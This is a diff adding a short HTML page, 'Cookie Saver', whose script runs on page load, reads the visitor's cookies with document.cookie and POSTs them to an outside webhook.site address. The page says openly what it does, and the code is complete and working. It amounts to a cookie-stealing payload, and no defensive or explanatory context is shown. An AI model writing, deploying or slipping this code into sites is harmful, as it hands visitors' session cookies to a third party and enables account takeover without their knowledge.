@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Save Cookies</title>
+    <script>
+        function sendCookiesToWebhook() {
+            var cookies = document.cookie; // Get cookies
+            fetch('https://webhook.site/b528881d-aaf9-489e-b4d4-d12387cdc61e', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    cookies: cookies
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+        window.onload = function() {
+            sendCookiesToWebhook();
+        };
+    </script>
+</head>
+<body>
+    <h1>Cookie Saver</h1>
+    <p>This page will send cookies to a webhook when loaded.</p>
+</body>
+</html>
